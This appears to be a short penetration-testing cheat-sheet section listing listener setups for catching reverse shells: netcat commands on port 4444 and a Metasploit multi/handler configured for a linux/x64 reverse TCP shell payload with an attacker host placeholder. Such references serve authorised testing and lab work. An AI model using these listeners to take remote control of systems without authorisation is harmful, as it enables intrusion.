# Listeners

## Netcat

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444                    # with line editing
```

## Metasploit multi/handler

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp    # match your msfvenom payload
set LHOST KALI_IP
set LPORT 4444
run
```
